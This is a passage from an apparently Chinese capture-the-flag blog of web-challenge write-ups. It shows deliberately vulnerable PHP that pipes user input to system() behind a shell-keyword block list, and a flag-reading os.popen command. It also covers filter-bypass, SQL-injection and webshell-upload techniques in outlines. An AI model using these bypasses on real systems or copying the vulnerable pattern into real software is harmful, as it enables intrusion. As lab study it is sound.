<span class="keyword">else</span>:</span><br><span class="line">        rv = num</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(rv)</span><br></pre></td></tr></table></figure>
<h3 id="pin码输入控制台进入交互式shell，执行命令即可得到flag："><a href="#pin码输入控制台进入交互式shell，执行命令即可得到flag：" class="headerlink" title="pin码输入控制台进入交互式shell，执行命令即可得到flag："></a>pin码输入控制台进入交互式shell，执行命令即可得到flag：</h3><blockquote>
<p>os.popen(“cat &#x2F;this_is_the_flag.txt”).read()</p>
</blockquote>
<h1 id="FBCTF2019-RCEService"><a href="#FBCTF2019-RCEService" class="headerlink" title="[FBCTF2019]RCEService"></a>[FBCTF2019]RCEService</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">putenv</span>(<span class="string">&#x27;PATH=/home/rceservice/jail&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;cmd&#x27;</span>])) &#123;</span><br><span class="line">  <span class="variable">$json</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!<span class="title function_ invoke__">is_string</span>(<span class="variable">$json</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">  &#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\x00-\x1FA-Z0-9!#-\/;-@\[-`|~\x7F]+).*$/&#x27;</span>, <span class="variable">$json</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Attempting to run command:&lt;br/&gt;&#x27;</span>;</span><br><span class="line">    <span class="variable">$cmd</span> = <span class="title function_ invoke__">json_decode</span>(<span class="variable">$json</span>, <span class="literal">true</span>)[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$cmd</span> !== <span class="literal">NULL</span>) &#123;</span><br><span class="line">      <span class="title function_ invoke__">system</span>(<span class="variable">$cmd</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&#x27;Invalid input&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;br/&gt;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="首先是putenv-PATH-home-rceservice-jail-，意味着我们无法直接去调用cat等命令，因为这些命令实际上是存放在特定目录中封装好的程序，PATH环境变量就是存放这些特定目录的路径方便我们去直接调用这些命令，所以此处部分命令我们得使用其存放的绝对路径去调用"><a href="#首先是putenv-PATH-home-rceservice-jail-，意味着我们无法直接去调用cat等命令，因为这些命令实际上是存放在特定目录中封装好的程序，PATH环境变量就是存放这些特定目录的路径方便我们去直接调用这些命令，所以此处部分命令我们得使用其存放的绝对路径去调用" class="headerlink" title="首先是putenv(&#39;PATH=/home/rceservice/jail&#39;);，意味着我们无法直接去调用cat等命令，因为这些命令实际上是存放在特定目录中封装好的程序，PATH环境变量就是存放这些特定目录的路径方便我们去直接调用这些命令，所以此处部分命令我们得使用其存放的绝对路径去调用"></a>首先是<code>putenv(&#39;PATH=/home/rceservice/jail&#39;);</code>，意味着我们无法直接去调用cat等命令，因为这些命令实际上是存放在特定目录中封装好的程序，PATH环境变量就是存放这些特定目录的路径方便我们去直接调用这些命令，所以此处部分命令我们得使用其存放的绝对路径去调用</h3><blockquote>
<p>Linux命令的位置：&#x2F;bin,&#x2F;usr&#x2F;bin，默认都是全体用户使用，&#x2F;sbin,&#x2F;usr&#x2F;sbin,默认root用户使用</p>
</blockquote>
<h3 id="然后是json格式"><a href="#然后是json格式" class="headerlink" title="然后是json格式"></a>然后是json格式</h3><blockquote>
<p>JSON 的两种结构：<br>1、对象：大括号 {} 保存的对象是一个无序的名称&#x2F;值对集合。一个对象以左括号 { 开始， 右括号 } 结束。每个”键”后跟一个冒号 :，名称&#x2F;值对使用逗号 , 分隔。<br>2、数组：中括号 [] 保存的数组是值（value）的有序集合。一个数组以左中括号 [ 开始， 右中括号 ] 结束，值之间使用逗号 , 分隔。<br>值（value）可以是双引号括起来的字符串（string）、数值(number)、true、false、 null、对象（object）或者数组（array），它们是可以嵌套。</p>
</blockquote>
<blockquote>
<p>JSON 值<br>JSON 值可以是：<br>数字（整数或浮点数）<br>字符串（在双引号中）<br>逻辑值（true 或 false）<br>数组（在中括号中）<br>对象（在大括号中）<br>null</p>
</blockquote>
<h3 id="最后是正则绕过"><a href="#最后是正则绕过" class="headerlink" title="最后是正则绕过"></a>最后是正则绕过</h3><h3 id="解法一：因为preg-match只能匹配第一行，所以这里可以采用多行绕过。"><a href="#解法一：因为preg-match只能匹配第一行，所以这里可以采用多行绕过。" class="headerlink" title="解法一：因为preg_match只能匹配第一行，所以这里可以采用多行绕过。"></a>解法一：因为preg_match只能匹配第一行，所以这里可以采用多行绕过。</h3><blockquote>
<p>?cmd&#x3D;</p>
</blockquote>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://xianxinyyds.github.io">xianxin</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://xianxinyyds.github.io/2025/01/28/BUU/">https://xianxinyyds.github.io/2025/01/28/BUU/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://xianxinyyds.github.io" target="_blank">仙心</a>！</span></div></div><div class="tag_share"><div class="post-share"><div class="social-share" data-image="/img/xianxin.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2025/02/25/HGAME2025/" title="HGAME 2025"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">HGAME 2025</div></div><div class="info-2"><div class="info-item-1">HGAME 2025webLevel 24 Pacman进去是个吃豆人游戏，game，game！！！！！！！！！！！！！！！！！！！！！！！，达到1w分给flag，这种一般是前端网页游戏，可以去f12的网络栏验证，如果你没有寄了还没有网络请求就是纯前端，这里就是然后先寄一次，爆了个一眼base64的假flag，这里直接去前端的2个js文件里面查找这个字符串，然后成功找到，分析其所在的函数，虽然被混淆，但是还是能看懂是结算判定，同时还有1w的16进制在语句中，所以真flag一定在这里再仔细看发现了_SOCRE这个参数，直接去控制台修改，然后再寄掉就是真flag了 _SOCRE&#x3D;10000  然后就是解码flag了，首先肯定是base64解码，得到一个有点像flag的字符串，观察发现hgame前缀是有的，不过被拆开了，跳着读发现规律，其实就是栅栏密码，即将字符串分成2栏，然后竖着读，解码得到flagLevel 47 BandBomb页面是个文件上传功能，查看源代码后发现除了上传就是修改名字，一开始先试了试一句话木马，然后发现读取不了uploads路径，但是背景图在的静态资源...</div></div></div></a><a class="pagination-related" href="/2025/01/27/ctfhub/" title="ctfhub"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">ctfhub</div></div><div class="info-2"><div class="info-item-1">CTFHub1.CTFHub目录遍历使用BP进行目录遍历，找到flag。 2.CTFHub备份文件下载1)网站源码题目给出了很多备份文件的可能的名字，一个个试不太现实，所以用御剑扫描端口，发现有www.zip的页面，访问得到备份文件，然后看到flag的txt文件中没有flag，先去备份文件中尝试访问，发现不行，然后去网页中访问，得到flag。 2)bak文件bak文件第一个题给我们说了他是备份文件后缀名之一，题目又说flag在index.php中，所以访问index.php.bak得到备份文件，进而得到flag。 3)vim缓存搜索vim缓存文件后缀名为.swp，然后直接访问index.php.swp，发现不行，然后继续搜索，得到.swp文件为隐藏文件，需要以.index.php.swp访问，然后得到备份文件，winhex打开得到flag。 4).DS_Store题目提示.DS_Store即为隐藏文件清单，访问下载后用winhex打开，找到flag对应位置，看到上面一串字符，想到可能要访问，但是一开始没看出来中间的.txt后缀，导致试了好多次，看出来之后就成功访问得到flag。（...</div></div></div></a></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/xianxin.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">xianxin</div><div class="author-info-description"></div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">20</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">2</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/xianxinyyds" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="mailto:1090084672@qq.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%BC%BA%E7%BD%91%E6%9D%AF-2019-%E9%9A%8F%E4%BE%BF%E6%B3%A8"><span class="toc-number">1.</span> <span class="toc-text">[强网杯 2019]随便注</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A6%96%E5%85%88%E7%94%A8%E5%BC%95%E5%8F%B7%E6%98%AF%E5%90%A6%E8%A6%81%E9%97%AD%E5%90%88%E5%88%A4%E6%96%AD%E6%98%AF%E5%AD%97%E7%AC%A6%E5%9E%8B%EF%BC%8C%E5%90%8C%E6%97%B6%E5%8F%91%E7%8E%B0-%E8%A2%AB%E8%BF%87%E6%BB%A4%EF%BC%8C%E6%89%80%E4%BB%A5%E9%80%89%E7%94%A8%E2%80%93-%EF%BC%8C%E5%B0%9D%E8%AF%95%E5%B8%B8%E8%A7%84%E7%9A%84%E6%B3%A8%E5%85%A5%E6%B5%81%E7%A8%8B%E5%8F%91%E7%8E%B0select%E8%A2%AB%E8%BF%87%E6%BB%A4%EF%BC%8C%E5%A4%A7%E5%B0%8F%E5%86%99%E7%BB%95%E8%BF%87%E4%B9%9F%E4%B8%8D%E8%A1%8C"><span class="toc-number">1.1.</span> <span class="toc-text">首先用引号是否要闭合判断是字符型，同时发现#被过滤，所以选用–+，尝试常规的注入流程发现select被过滤，大小写绕过也不行.</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8E%E6%98%AF%E5%B0%9D%E8%AF%95%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5%E6%98%AF%E5%90%A6%E5%8F%AF%E8%A1%8C%E3%80%82"><span class="toc-number">1.2.</span> <span class="toc-text">于是尝试堆叠注入是否可行。</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%91%E7%8E%B0%E5%8F%AF%E8%A1%8C%EF%BC%8C%E4%BA%8E%E6%98%AF%E7%BB%A7%E7%BB%AD%E7%88%86%E8%A1%A8%E5%90%8D%E3%80%82"><span class="toc-number">1.3.</span> <span class="toc-text">发现可行，于是继续爆表名。</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%88%86%E5%87%BA%E4%B8%A4%E4%B8%AA%E8%A1%A8%E2%80%9D1919810931114514%E2%80%9D%E5%92%8C%E2%80%9Dwords%E2%80%9D%EF%BC%8C%E4%BA%8E%E6%98%AF%E5%B0%9D%E8%AF%95%E7%88%86%E5%88%97%E5%90%8D"><span class="toc-number">1.4.</span> <span class="toc-text">爆出两个表”1919810931114514”和”words”，于是尝试爆列名.</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%88%86%E5%87%BAflag%E7%9A%84%E6%95%B0%E6%8D%AE%E5%90%8D%EF%BC%8C%E5%B0%9D%E8%AF%95%E8%84%B1%E5%BA%93%EF%BC%8C%E5%9B%A0%E4%B8%BAselect%E8%A2%AB%E8%BF%87%E6%BB%A4%EF%BC%8C%E6%89%80%E4%BB%A5%E5%B0%9D%E8%AF%95handler%E5%91%BD%E4%BB%A4%E8%BF%9B%E8%A1%8C%E8%84%B1%E5%BA%93%E3%80%82"><span class="toc-number">1.5.</span> <span class="toc-text">爆出flag的数据名，尝试脱库，因为select被过滤，所以尝试handler命令进行脱库。</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%84%E9%80%A0payload"><span class="toc-number">1.6.</span> <span class="toc-text">构造payload</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BE%97%E5%88%B0flag"><span class="toc-number">1.7.</span> <span class="toc-text">得到flag</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-EasySQL"><span class="toc-number">2.</span> <span class="toc-text">[极客大挑战 2019]EasySQL</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-HardSQL"><span class="toc-number">3.</span> <span class="toc-text">[极客大挑战 2019]HardSQL</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%88%E8%AF%95%E4%BA%86%E8%AF%95%E5%B8%B8%E8%A7%84%E6%B3%A8%E5%85%A5%EF%BC%8C%E5%8F%91%E7%8E%B0%E5%87%A0%E4%B9%8E%E4%B8%80%E7%9B%B4%E6%9C%89%E2%80%9C%E5%8F%AF%E5%88%AB%E8%A2%AB%E6%88%91%E9%80%AE%E5%88%B0%E4%BA%86%E2%80%9D%EF%BC%8C%E8%AF%B4%E6%98%8E%E5%BE%88%E5%A4%9A%E5%85%B3%E9%94%AE%E8%AF%8D%E9%83%BD%E8%A2%AB%E8%BF%87%E6%BB%A4%E4%BA%86%EF%BC%8C%E6%89%80%E4%BB%A5%E7%94%A8BP%E5%8A%A0%E4%B8%8Asql%E5%85%B3%E9%94%AE%E8%AF%8D%E5%AD%97%E5%85%B8%E8%BF%9B%E8%A1%8Cfuzz%EF%BC%88%E6%A8%A1%E7%B3%8A%E6%B5%8B%E8%AF%95%EF%BC%89%EF%BC%8C%E5%88%A4%E6%96%AD%E6%9C%89%E5%93%AA%E4%BA%9B%E5%85%B3%E9%94%AE%E8%AF%8D%E8%A2%AB%E8%BF%87%E6%BB%A4"><span class="toc-number">3.1.</span> <span class="toc-text">先试了试常规注入，发现几乎一直有“可别被我逮到了”，说明很多关键词都被过滤了，所以用BP加上sql关键词字典进行fuzz（模糊测试），判断有哪些关键词被过滤</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#fuzz%E4%B9%8B%E5%90%8E%E5%8F%91%E7%8E%B0%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%89%A9%E4%BA%86%E4%B8%80%E4%B8%AA%E6%BC%8F%E7%BD%91%E4%B9%8B%E9%B1%BCextractvalue%EF%BC%8C%E6%8A%A5%E9%94%99%E4%B9%9F%E6%9C%89%E5%9B%9E%E6%98%BE%EF%BC%8C%E6%89%80%E4%BB%A5%E5%B0%B1%E7%94%A8%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E4%BA%86%EF%BC%8C%E5%90%8C%E6%97%B6%E7%A9%BA%E6%A0%BC%E4%B9%9F%E8%A2%AB%E4%B8%A5%E9%87%8D%E8%BF%87%E6%BB%A4%EF%BC%8C%E5%B8%B8%E8%A7%84%E7%BB%95%E8%BF%87%E9%83%BD%E9%9A%BE%E4%BB%A5%E7%BB%95%E8%BF%87%EF%BC%8C%E6%89%80%E4%BB%A5%E7%9B%B4%E6%8E%A5%E9%9D%A0%EF%BC%88%EF%BC%89%E6%9D%A5%E8%BF%9B%E8%A1%8C%E7%A9%BA%E6%A0%BC%E4%BB%A3%E6%9B%BF-%E5%92%8C%E2%80%93-%E4%B9%9F%E8%A2%AB%E8%BF%87%E6%BB%A4%EF%BC%8C%E4%BD%86%E6%98%AF-%E5%8F%AF%E4%BB%A5%E7%94%A8-23%E4%BB%A3%E6%9B%BF%EF%BC%8Cand%E4%B9%9F%E8%A2%AB%E8%BF%87%E6%BB%A4%EF%BC%8C%E4%BD%86%E6%98%AFor%E6%B2%A1%E6%9C%89%E8%A2%AB%E8%BF%87%E6%BB%A4%EF%BC%8C%E6%9E%84%E9%80%A0payload%E3%80%82"><span class="toc-number">3.2.</span> <span class="toc-text">fuzz之后发现报错注入剩了一个漏网之鱼extractvalue，报错也有回显，所以就用报错注入了，同时空格也被严重过滤，常规绕过都难以绕过，所以直接靠（）来进行空格代替,#和–+也被过滤，但是#可以用%23代替，and也被过滤，但是or没有被过滤，构造payload。</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BE%97%E5%88%B0geek%E7%9A%84%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D"><span class="toc-number">3.3.</span> <span class="toc-text">得到geek的数据库名</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BE%97%E5%88%B0H4rDsq1%E7%9A%84%E8%A1%A8%E5%90%8D"><span class="toc-number">3.4.</span> <span class="toc-text">得到H4rDsq1的表名</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BE%97%E5%88%B0id-username-password%E7%9A%84%E5%88%97%E5%90%8D"><span class="toc-number">3.5.</span> <span class="toc-text">得到id,username,password的列名</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%91%E7%8E%B0%E8%B6%85%E8%BF%87%E6%8A%A5%E9%94%99%E5%9B%9E%E6%98%BE%E6%9C%80%E5%A4%A7%E5%AD%97%E7%AC%A6%E6%95%B0%EF%BC%8C%E5%90%8C%E6%97%B6substr%E4%B9%9F%E8%A2%AB%E8%BF%87%E6%BB%A4%E4%BA%86%EF%BC%8C%E6%89%80%E4%BB%A5%E8%80%83%E8%99%91%E4%BD%BF%E7%94%A8right%EF%BC%88%E6%95%B0%E6%8D%AE%EF%BC%8C%E9%95%BF%E5%BA%A6%EF%BC%89%E5%87%BD%E6%95%B0%EF%BC%8C%E5%8A%9F%E8%83%BD%E4%B8%BA%E4%BB%8E%E5%8F%B3%E8%BE%B9%E8%AF%BB%E5%8F%96%E4%B8%80%E5%AE%9A%E9%95%BF%E5%BA%A6%E7%9A%84%E5%AD%97%E7%AC%A6%E3%80%82"><span class="toc-number">3.6.</span> <span class="toc-text">发现超过报错回显最大字符数，同时substr也被过滤了，所以考虑使用right（数据，长度）函数，功能为从右边读取一定长度的字符。</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%80%E5%90%8E%E6%8B%BC%E6%8E%A5%E5%88%B0%E4%B8%80%E8%B5%B7%E5%B0%B1%E5%BE%97%E5%88%B0flag%E4%BA%86"><span class="toc-number">3.7.</span> <span class="toc-text">最后拼接到一起就得到flag了</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%8B%AC%E5%8F%B7%E8%BF%99%E4%B9%88%E5%A4%9A%E5%A4%AA%E5%AE%B9%E6%98%93%E6%BC%8F%E4%BA%86%EF%BC%8C%E6%9C%89%E4%B8%80%E7%A7%8Ddebug%E7%9A%84%E7%BE%8E%EF%BC%88-%EF%BC%89"><span class="toc-number">3.7.0.0.0.1.</span> <span class="toc-text">括号这么多太容易漏了，有一种debug的美（-_-）</span></a></li></ol></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Upload"><span class="toc-number">4.</span> <span class="toc-text">[ACTF2020 新生赛]Upload</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E5%BC%80%E5%A7%8B%E6%B2%A1%E6%9C%89%E6%80%9D%E8%B7%AF%EF%BC%8C%E5%89%8D%E7%AB%AF%E9%AA%8C%E8%AF%81%E5%BE%88%E5%A5%BD%E7%BB%95%E8%BF%87%EF%BC%8CBP%E4%BF%AE%E6%94%B9%E5%8D%B3%E5%8F%AF%EF%BC%8C%E4%BD%86%E6%98%AF%E5%90%8E%E7%AB%AF%E5%BA%94%E8%AF%A5%E6%98%AF%E6%A3%80%E6%B5%8B%E6%98%AF%E5%90%A6%E4%B8%BA-php%E5%90%8E%E7%BC%80%E7%9A%84%E5%BE%88%E9%9A%BE%E7%BB%95%E8%BF%87%EF%BC%8C-htaccess%E4%B9%9F%E5%9B%A0%E4%B8%BA%E4%B8%8A%E4%BC%A0%E5%90%8E%E4%BC%9A%E9%9A%8F%E6%9C%BA%E7%94%9F%E6%88%90%E6%96%87%E4%BB%B6%E5%90%8D%E5%AF%BC%E8%87%B4%E5%A4%B1%E6%95%88%EF%BC%8C%E5%85%B6%E4%BB%96%E6%96%B9%E5%BC%8F%E4%B9%9F%E4%B8%8D%E5%A5%BD%E7%94%A8%E3%80%82"><span class="toc-number">4.1.</span> <span class="toc-text">一开始没有思路，前端验证很好绕过，BP修改即可，但是后端应该是检测是否为.php后缀的很难绕过，.htaccess也因为上传后会随机生成文件名导致失效，其他方式也不好用。</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%86%E8%A7%A3%E5%88%B0%E8%BF%98%E6%9C%89%E4%B8%80%E7%A7%8D%E8%83%BD%E8%BF%90%E8%A1%8Cphp%E4%BB%A3%E7%A0%81%E7%9A%84%E6%96%87%E4%BB%B6%E5%90%8E%E7%BC%80%E5%90%8D-phtml%E4%B9%8B%E5%90%8E%E5%B0%B1%E5%A5%BD%E5%81%9A%E4%BA%86%EF%BC%8C%E7%9B%B4%E6%8E%A5%E4%B8%8A%E4%BC%A0-png%E7%9A%84%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%EF%BC%8CBP%E6%8A%93%E5%8C%85%E6%94%B9%E6%88%90-phtml%E5%8D%B3%E5%8F%AF"><span class="toc-number">4.2.</span> <span class="toc-text">了解到还有一种能运行php代码的文件后缀名.phtml之后就好做了，直接上传.png的一句话木马，BP抓包改成.phtml即可</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#GXYCTF2019-BabyUpload"><span class="toc-number">5.</span> <span class="toc-text">[GXYCTF2019]BabyUpload</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%99%E4%B8%AA%E9%A2%98%E4%B9%9F%E6%98%AF%E5%89%8D%E5%90%8E%E7%AB%AF%E9%83%BD%E6%9C%89%E9%AA%8C%E8%AF%81%EF%BC%8C%E7%9B%B4%E6%8E%A5%E4%B8%8A%E4%BC%A0-php%E6%96%87%E4%BB%B6%E6%98%BE%E7%A4%BA%E5%90%8E%E7%BC%80%E5%90%8D%E4%B8%8D%E8%83%BD%E6%9C%89ph%EF%BC%8C%E5%90%8C%E6%97%B6%E5%9B%A0%E4%B8%BA%E4%B8%8A%E4%BC%A0%E7%9A%84%E6%96%87%E4%BB%B6%E4%B8%8D%E4%BC%9A%E9%9A%8F%E6%9C%BA%E7%94%9F%E6%88%90%E6%96%87%E4%BB%B6%E5%90%8D%EF%BC%8C%E6%89%80%E4%BB%A5%E5%8F%AF%E4%BB%A5%E7%94%A8-htaccess%E8%A7%A3%E9%A2%98%EF%BC%8C%E4%BD%86%E6%98%AF%E4%B8%8A%E4%BC%A0-jpg%E6%96%87%E4%BB%B6%E5%90%8E%E5%90%8E%E7%AB%AF%E9%AA%8C%E8%AF%81%E4%B8%80%E7%9B%B4%E8%BF%87%E4%B8%8D%E5%8E%BB%EF%BC%8C%E7%9C%8B%E4%BA%86%E6%BA%90%E4%BB%A3%E7%A0%81%E6%89%8D%E7%9F%A5%E9%81%93%E5%8E%9F%E6%9D%A5%E6%98%AF%E6%A3%80%E6%B5%8B%E7%9A%84%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9%E9%87%8C%E9%9D%A2%E6%98%AF%E5%90%A6%E6%9C%89php%E6%A0%87%E7%AD%BE%EF%BC%8C%E6%90%9C%E7%B4%A2%E4%BA%86%E4%B8%80%E4%B8%8B%E4%BA%86%E8%A7%A3%E5%88%B0%E5%8F%AF%E4%BB%A5%E7%94%A8script%E7%B1%BB%E5%9E%8B%E6%A0%87%E7%AD%BE%EF%BC%8C%E4%B8%8A%E4%BC%A0%E4%B9%8B%E5%90%8E%E7%94%A8-htaccess%E5%B0%86jpg%E8%A7%A3%E6%9E%90%E4%B8%BAphp%E5%8D%B3%E5%8F%AF%E3%80%82"><span class="toc-number">5.1.</span> <span class="toc-text">这个题也是前后端都有验证，直接上传.php文件显示后缀名不能有ph，同时因为上传的文件不会随机生成文件名，所以可以用.htaccess解题，但是上传.jpg文件后后端验证一直过不去，看了源代码才知道原来是检测的文件内容里面是否有php标签，搜索了一下了解到可以用script类型标签，上传之后用.htaccess将jpg解析为php即可。</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#GXYCTF2019-Ping-Ping-Ping"><span class="toc-number">6.</span> <span class="toc-text">[GXYCTF2019]Ping Ping Ping</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9C%8B%E5%88%B0ping%EF%BC%8C%E7%9F%A5%E9%81%93%E5%A4%A7%E6%A6%82%E7%8E%87%E6%98%AF%E5%9C%A8ping%E4%B8%80%E4%B8%AA%E5%9C%B0%E5%9D%80%E7%9A%84%E5%90%8C%E6%97%B6%E7%94%A8%EF%BC%9B%E6%88%96%E8%80%85-%E8%BF%9B%E8%A1%8C%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%EF%BC%8C%E6%89%80%E4%BB%A5%E5%85%88%E8%AF%95%E8%AF%95ls%E5%91%BD%E4%BB%A4"><span class="toc-number">6.1.</span> <span class="toc-text">看到ping，知道大概率是在ping一个地址的同时用；或者||进行命令执行，所以先试试ls命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9C%8B%E5%88%B0flag-php%EF%BC%8C%E5%BD%93%E5%9C%BA%E5%B0%B1%E6%83%B3%E7%9B%B4%E6%8E%A5cat%E6%8B%BF%E5%88%B0flag%EF%BC%8C%E4%BD%86%E6%98%AF%E6%98%BE%E7%A4%BA%E7%AC%A6%E5%8F%B7%E8%A2%AB%E8%BF%87%E6%BB%A4%EF%BC%8C%E5%88%A4%E6%96%AD%E4%B8%BA%E7%A9%BA%E6%A0%BC"><span class="toc-number">6.2.</span> <span class="toc-text">看到flag.php，当场就想直接cat拿到flag，但是显示符号被过滤，判断为空格</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%99%E9%87%8C%E5%B0%9D%E8%AF%95%E4%B9%8B%E5%90%8E%E5%8F%91%E7%8E%B0%E5%A4%A7%E9%83%A8%E5%88%86%E9%83%BD%E8%A2%AB%E8%BF%87%E6%BB%A4%EF%BC%8C%E4%BD%86%E6%98%AF-IFS-1%E8%BF%98%E8%83%BD%E7%94%A8%EF%BC%8C%E6%89%80%E4%BB%A5%E5%B0%9D%E8%AF%95cat-IFS-1flag-php%EF%BC%8C%E5%8F%91%E7%8E%B0%E6%98%BE%E7%A4%BAflag%E8%A2%AB%E8%BF%87%E6%BB%A4"><span class="toc-number">6.3.</span> <span class="toc-text">这里尝试之后发现大部分都被过滤，但是$IFS$1还能用，所以尝试cat$IFS$1flag.php，发现显示flag被过滤</span></a></li><li class="toc-item toc-level-2"><a 